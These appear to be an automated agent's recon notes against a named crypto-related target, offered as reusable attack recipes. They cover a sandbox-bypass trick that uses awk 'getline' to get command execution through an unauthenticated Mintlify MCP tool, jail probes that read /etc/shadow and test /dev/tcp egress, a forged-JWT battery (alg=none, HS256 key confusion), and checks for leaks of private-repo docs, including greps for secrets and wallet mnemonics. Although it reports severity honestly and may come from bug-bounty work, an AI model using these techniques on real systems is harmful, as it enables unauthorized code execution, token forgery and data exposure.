# Mintlify MCP command-exec + OIDC/JWT + private-repo-Public-Pages recon
# (Cantor8, CDC Agent 4 CHAINER, 2026-08-14)

Three reusable recon/probe recipes that generalize beyond this target.

---

## 1. Mintlify `query_docs_filesystem` — "read-only virtual FS" is often a REAL bash

Mintlify-hosted docs expose an unauthenticated MCP endpoint at `https://<project>.mintlify.app/mcp`
(SSE transport). One of its tools is `query_docs_filesystem(_<name>)` whose description CLAIMS it is
"a read-only shell-like query against a virtualized, in-memory filesystem ... NOT a shell on any real
machine ... nothing runs on the server host." **Verify that claim — it is frequently false.**

### How to talk to it (SSE, unauthenticated)
POST JSON-RPC to `/mcp` with headers `Content-Type: application/json` and
`Accept: application/json, text/event-stream`. Body:
```json
{"jsonrpc":"2.0","id":1,"method":"tools/call",
 "params":{"name":"query_docs_filesystem_<name>","arguments":{"command":"<cmd>"}}}
```
Response is SSE: read lines starting `data: `, parse JSON, take `result.content[0].text`.
The exact tool name varies — call `tools/list` first and use the real name (it may have a
`_<project>` suffix, e.g. `query_docs_filesystem_cantor8_documentation`).

### Fingerprint: is it a real shell behind the "virtual FS"?
Send probes that only a real shell would react to:
- `ls /etc ; id` → if you get `bash: id: command not found`, a **real bash** parsed the `;` and ran
  `id` (it's just not in the jailed PATH). A true in-memory FS emulator would reject the metachar.
- `echo $(id)` / `` echo `id` `` → command substitution executing (even to an error) = real shell.
- `echo shell=$0 pid=$$` → `shell=bash pid=1` = real bash as init inside a container.
- `env` / `jq -n "env"` → dumps real process env (HOSTNAME, OSTYPE, MACHTYPE, HOME, PATH...).

### The escape: awk `cmd | getline` bypasses a blocked `system()`
Sandboxes that DO jail the FS often still block obvious exec: `awk 'BEGIN{system("id")}'` returns
`awk: system() is not supported - shell execution not allowed in sandboxed environment`.
**Bypass — awk's coprocess form is usually NOT blocked:**
```
awk "BEGIN{\"id; uname -a\" | getline x; print x}"
```
`"cmd" | getline` spawns a real subprocess through the shell → arbitrary command execution primitive
even when `system()` is explicitly denied. This is the single highest-value trick for this class.

### Scope the jail (decides impact — do NOT overclaim)
After proving exec, immediately test containment so you report honest severity:
- Read outside root: `awk "BEGIN{\"cat /etc/shadow\" | getline x; print x}"`, `ls -la /` — if the awk
  `ls /` shows only the docs dir (`total 9`), you're in the SAME chroot, not the host.
- Network egress: `(exec 3<>/dev/tcp/1.1.1.1/80 && echo OPEN)` → `Read-only file system` / fail = no egress.
- Available binaries: `command -v curl wget python3 nc base64` — if none, exfil/pivot is hard.
- `/proc`, `/etc` visibility: `cat /proc/version` → `No such file` = strong jail.

**Honest verdict for Cantor8:** real command execution CONFIRMED (awk getline bypass), but inside a
locked read-only chroot (pid 1, no net, no curl/wget/python, no secrets, only docs). Report as a real
vuln (false "no execution" claim + sandbox-bypass) but NOT a path to funds/data by itself. A jail
escape would need a setuid binary or kernel bug — none found.

---

## 2. OIDC / JWT-issuing service fingerprint (id.<domain>)

A standalone identity host (`id.<domain>`, Keycloak/Auth0/custom) has a small, high-value surface.
Probe in one batch:
```
/.well-known/jwks.json          # <-- the money shot: public signing keys (kty, kid, alg, n, e)
/.well-known/openid-configuration
/.well-known/oauth-authorization-server
/authorize  /oauth/token  /token  /userinfo  /certs  /oauth2/certs  /keys  /jwks
/protocol/openid-connect/certs                       # Keycloak
/realms/master/.well-known/openid-configuration      # Keycloak realm discovery
/health  /healthz  /version  /status
```
- `/.well-known/jwks.json` returning 200 with `{keys:[{kty:RSA, kid, alg:RS256, n, e}]}` = the public
  key used to verify ALL backend JWTs. Record `kid` + `alg` + `n` — you need them for forgery probes.
- Only `jwks.json` + `/health` live (everything else 404) = a minimal/custom IdP, NOT stock Keycloak
  (which would answer `/protocol/openid-connect/certs`). Tells you the token-ISSUANCE flow is
  undocumented/custom → next recon target is the client app (mobile APK / web signup), not the IdP.

### Forged-JWT battery against the consuming API (e.g. `/api/balance`)
Fire each with valid-looking claims (real partyId / iss from config endpoint, future exp). Record the
EXACT error string per variant — uniformity reveals a well-built verifier:
| Variant | Expectation if verifier is GOOD |
|---|---|
| `alg=none` (empty sig) | 401 reject |
| garbage `aaa.bbb.ccc` | 401 reject |
| RS256 + bad signature (real kid) | 401 reject |
| RS256 + unknown kid (forces JWKS refetch) | 401 reject |
| HS256 alg-confusion (public RSA key as HMAC secret) | 401 reject |
Cantor8: ALL returned identical `401 {"detail":"Invalid or expired token"}` → alg-allowlist + signature
+ kid all enforced; naive forgery CLOSED. If any variant returns 200 or a DIFFERENT error, that's the
crack to widen. A uniform 401 across the battery = report verifier as robust, pivot elsewhere.

---

## 3. Private repo behind PUBLIC GitHub Pages (source-leak check)

A doc/product site at `https://<org>.github.io/<repo>/` can be served from a repo that is PRIVATE in
the API (Pages can be public while code is private). Check both:
- `https://api.github.com/repos/<org>/<repo>` → 404 = private/deleted, but Pages may STILL serve.
- If Pages serves, the repo NAME is in the page: `<link rel="canonical" href="https://github.com/<org>/<repo>/">`.
- **Leak check:** fetch `/<repo>/search/search_index.json` (mkdocs-material always ships it — it contains
  EVERY page's full text) and `/<repo>/sitemap.xml`. If the index lists real pages, you've recovered the
  private repo's rendered docs without auth. Cantor8: index had 1 empty page + sitemap only linked back
  to the repo → stub site, NO leak. A populated `search_index.json` = full private-doc disclosure.

### Reading the real content via the PUBLIC Mintlify mirror
When the private repo is just docs, the SAME content is usually on the public Mintlify docs site. Use
the MCP `query_docs_filesystem` tool to `tree / -L 3`, then `cat` the high-value pages:
`enterprise-wallet/authentication.mdx`, `configuration.mdx`, `docker-compose-deployment.mdx` — these
leak the auth model (env vars like `AUTH_TYPE=noop`, JWKS URLs, DB defaults, deploy topology) even when
the source repo is private. `rg -in '<keyword>' /` across the whole doc tree for `recovery|admin|coupon|
secret|mnemonic|withdraw` finds the juicy endpoints fast.
